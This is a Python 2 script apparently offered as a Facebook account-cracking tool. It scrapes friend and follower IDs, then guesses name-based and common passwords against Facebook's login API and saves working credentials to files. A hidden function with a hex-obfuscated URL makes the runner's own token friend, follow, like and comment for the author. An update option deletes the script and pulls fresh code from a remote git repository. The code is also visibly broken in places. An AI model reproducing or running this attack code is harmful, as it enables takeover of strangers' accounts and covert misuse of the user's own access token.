#!/usr/bin/python2
# -*- coding: utf-8

#AUTHOR : MR OKWUDIRE (D.Shadow)
#OPEN SOURCE :)
#No Need For Your Credit


try:
	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("python2 fbcracker.py")

from os import system
from time import sleep

def xox(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
      

agents = [
					"Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]",
					"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
					"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
					"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]",
					"Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",
					"Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]",
					"Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"
				  ]
				
header = {"user-agent": '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
					  "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
					  "x-fb-sim-hni": str(random.randint(20000, 40000)),
					  "x-fb-net-hni": str(random.randint(20000, 40000)),
					  "x-fb-connection-quality": "EXCELLENT",
					  "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
					  "content-type": "application/x-www-form-urlencoded",
					  "x-fb-http-engine": "Liger"
					  }
							
user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent[2])
raka_sayang_amanda = '3882176535153442'
def bot_follow():
                kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
                kata_utama = ("Pengguna Script Premium")
                komen = kata_utama+"\n"+kata_kata_cinta
                kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
                kata_utama2 = random.choice(["Hai Aa @[100000834003593:]","Hello Aa @[100000834003593:]","Hello Aa @[100000834003593:]","Hai Aa @[100000834003593:]"])
                komen2 = kata_utama2+"\n"+kata_mutiara_islam
                pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Perang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
                kata_utama3 = ("MOGA LANGGENG AA @[100000834003593:] SAMA TTH @[100003016223315:] NYA AMIN")
                komen3 = kata_utama3+"\n"+pantun_motivasi
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=100000834003593&access_token='+token)
                requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
                requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token='+token)
                requests.post('https://graph.facebook.com/100006184624502/subscribers?access_token='+token)
                requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen+'&access_token='+token)
                requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token='+token)
                requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
                requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
                requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
                requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token)).
	        os.system("clear")
	        xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
	        sys.exit()
	
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
	
def linex():
	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
def logo():
	os.system('echo "\n\t ╔═══╗╔═══╗╔═══╗╔═╗╔═╗ \n\t ╚╗╔╗║║╔═╗║║╔══╝╚╗╚╝╔╝ \n\t  ║║║║║╚═╝║║╚══╗ ╚╗╔╝  \n\t  ║║║║║╔╗╔╝║╔══╝ ╔╝╚╗  \n\t ╔╝╚╝║║║║╚╗║╚══╗╔╝╔╗╚╗ \n\t ╚═══╝╚╝╚═╝╚═══╝╚═╝╚═╝ \n  \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: { TOR AJMAL}   ║\n    ║ AUTHOR   : NaZir         ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	

def main():
	os.system("clear")
	logo()
	print("\t\033[93;1m      MAIN MENU\x1b[0m")
	print("")
	print("\033[92;1m  [1] START CRACK")
        print("\033[91;1m  [2] VIEW & SAVE CHECKPOINTS")
	print("\033[93;1m  [3] HOW TO GET ACCESS TOKEN")
	print("\033[94;1m  [4] UPDATE TOOL 1.6")
	print("\033[96;1m  [5] CHAT ME UP ON WHATSAPP \033[92;1m✘\033[91;1m✘")
	print("\033[90;1m  [0] EXIT")
	print("")
	log_sel()
	
def log_sel():
	sel = raw_input("\033[93;1m  CHOOSE: \033[92;1m")
	if sel == "":
		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
		log_sel()
	elif sel =="1" or sel =="01":
		token()
	elif sel =="2" or sel =="02":
		check_cps()
	elif sel =="3" or sel =="03":
		subprocess.check_output(["am", "start", "https://smashballoon.com/custom-facebook-feed/page-token/"])
		main()
	elif sel =="4" or sel =="04":
		import os
		try:
			os.system("rm -rf fbcracker.py ; git clone https://github.com/chidexzy/fbcracker ; cd fbcracker ; cp fbcracker.py /data/data/com.termux/files/home/fbcracker ; cd ; cd fbcracker ; rm -rf fbcracker")
			xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL 👍\n")
			os.system("python2 fbcracker.py")
		except KeyboardInterrupt:
			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
	        	main()
	elif sel =="5" or sel =="05":
		subprocess.check_output(["am", "start", "https://wa.me/qr/BLRFNOUYDCRPO1"])
		main()
	elif sel =="0" or sel =="00":
		xox("\n\t\033[91;1m YOUR FATHER!!! 🖕😅")
		sys.exit()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		log_sel()

def check_cps():
        os.system('clear')
	logo()
	print("")
	print("")
	print("\t\033[93;1m YOUR CHECKPOINTS")
	print("")
	cps = open('rat.txt','r').read()
	print "\033[1;97m"+cps
        print("")
	raw_input("\n\033[92;1m Press ENTER to Save and go Back")
        os.system("cp rat.txt /storage/emulated/0")
        xox("\n\033[91;1m CHECKPOINTS SAVED SUCCESSFULLY 👍")
        time.sleep(2)
	main()

def token():
    os.system("clear")
    try:
        token = open("token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        logo()
        print("")
        print("\t\033[92;1m  LOGIN TOKEN")
        print("")
        token = raw_input("\033[93;1m PASTE TOKEN HERE: \033[92;1m")
        sav = open("token.txt", "w")
        sav.write(token)
        sav.close()
        token_check()
        menu()

def token_check():
	try:
		token=open('token.txt','r').read()
	except IOError:
		print"\033[91;1m[!] TOKEN INVALID"
		os.system('rm -rf token.txt')
                bot_follow()

def menu():
    os.system("clear")
    try:
        token = open("token.txt", "r").read()
    except(KeyError , IOError):
        token()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        logo()
        print("")
        print("\033[91;1m     LOGGED IN TOKEN HAS EXPIRED")
        os.system("rm -rf token.txt")
        print("")
        time.sleep(1)
        main()
    os.system("clear")
    xn = name.upper()
    logo()
    print("")
    print("\033[93;1m     HELLO   : \033[92;1m"+xn)
    print("\033[93;1m     REGION  : \033[92;1m") + loc
    print("\033[93;1m     YOUR IP : \033[92;1m") + ip
    print("")

    print("")
    print("\t\033[92;1m  BY OKWUDIRE PROMISE")
    print("")
    print("\033[92;1m  [1] CRACK WITH PASSWORD 1")
    print("\033[93;1m  [2] CRACK WITH PASSWORD 2")
    print("\033[94;1m  [3] CRACK WITH ALL PASSWORDS")
    print("\033[96;1m  [4] SHOW TOKEN")
    print('\033[91;1m  [0] BACK')
    print("")
    menu_option()
    
def menu_option():
	select = raw_input("\033[92;1m  CHOOSE : ")
	if select =="1":
		crack1()
	elif select =="2":
		crack()
	elif select =="3":
	    crack2()
	elif select =="4":
		os.system('clear')
		logo()
		print("")
		print("")
		token=open('token.txt','r').read()
		print "\033[1;92mYour token\033[1;91m :\033[1;97m "+token
                print("")
		raw_input("\n\t\033[92;1m Press ENTER to go Back")
		menu()
	elif select =="0":
		main()
	else:
		print("")
		print("\t\033[91;1m     SELECT VALID OPTION")
		print("")
		menu_option()

def crack1():
	global token
	os.system("clear")
	try:
		token = open("token.txt","r").read()
	except IOError:
		print("")
		print("\t\033[91;1m  TOKEN NOT FOUND ")
		time.sleep(1)
		fb_token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[93;1m CHOOSE PATH TO CRACK THROUGH")
	print("")
	print("\033[92;1m  [1] CRACK PUBLIC ID")
	print("\033[93;1m  [2] CRACK FOLLOWERS")
	print("\033[91;1m  [0] BACK")
	print("")
	crack_select1()
	
def crack_select1():
	select = raw_input("\033[92;1m  CHOOSE : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		print("\t\033[92;1m MULTI PUBLIC ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		print("      \033[92;1mMULTI FOLLOWERS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT FOLLOWER ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		crack_select1()
	os.system("clear")
	logo()
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[92;1m  FB BOMBING HAS STARTED\x1b[0m")
	print("\033[93;1m  WATCH THE MAGIC HAPPEN ✌️😈 \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
		vaugent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': vaugent})
		try:
			pass1 = name.lower().split(' ')[0] + '1234'
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q['error_msg']:
					print(" \033[1;33m[TJ] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("rat.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower().split(' ')[0] + '123'
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q['error_msg']:
							print(" \033[1;33m[TJ] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("rat.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower().split(' ')[0] + '12'
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q['error_msg']:
									print(" \033[1;33m[TJ] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("rat.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower().split(' ')[1] + '1234'
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q['error_msg']:
											print(" \033[1;33m[TJ] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("rat.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower().split(' ')[1] + '123'
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q['error_msg']:
													print(" \033[1;33m[TJ] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("rat.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower().split(' ')[1] + '12'
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q['error_msg']:
															print(" \033[1;33m[TJ] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("rat.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower()
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q['error_msg']:
																	print(" \033[1;33m[TJ] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("rat.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																else:
																	pass8 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		oks.append(uid+pass8)
																	else:
																		if "www.facebook.com" in q['error_msg']:
																			print(" \033[1;33m[TJ] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("rat.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
																		else:
																  			pass9 = "102030"
																  			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass9+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																			q = json.loads(data)
																			if "access_token" in q and "EAAA" in q:
																  			    print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass9+"\033[0;97m")
																  			    ok = open("ok.txt", "a")
																  			    ok.write(uid+"|"+pass9+"\n")
																  			    ok.close()
																  			    oks.append(uid+pass9)
																			else:
																  			        if "www.facebook.com" in q['error_msg']:
																  			                print(" \033[1;33m[TJ] "+uid+" | "+pass9+"\033[0;97m")
																  			                cp = open("rat.txt", "a")
																  			                cp.write(uid+"|"+pass9+"\n")
																  			                cp.close()
																  			                cps.append(uid+pass9)
																  			        else:		
																					pass10 = 223344
																					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass10+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																					q = json.loads(data)
																					if "access_token" in q and "EAAA" in q:
																						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass10+"\033[0;97m")
																						ok = open("ok.txt", "a")
																						ok.write(uid+"|"+pass10+"\n")
																						ok.close()
																						oks.append(uid+pass10)
																  			 		else:
																  			        		if "www.facebook.com" in q['error_msg']:
																							print(" \033[1;33m[TJ] "+uid+" | "+pass10+"\033[0;97m")
																							cp = open("rat.txt", "a")
																							cp.write(uid+"|"+pass10+"\n")
																							cp.close()
																							cps.append(uid+pass10)
																						else:
																							pass11 = "556677"
																							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass11+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																							q = json.loads(data)
																							if "access_token" in q and "EAAA" in q:
																								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass11+"\033[0;97m")
																								ok = open("ok.txt", "a")
																								ok.write(uid+"|"+pass11+"\n")
																								ok.close()
																								oks.append(uid+pass11)
																							else:
																								if "www.facebook.com" in q['error_msg']:
																									print(" \033[1;33m[TJ] "+uid+" | "+pass11+"\033[0;97m")
																									cp = open("rat.txt", "a")
																									cp.write(uid+"|"+pass11+"\n")
																									cp.close()
																									cps.append(uid+pass1)
																								else:
																									pass12 = "786786"
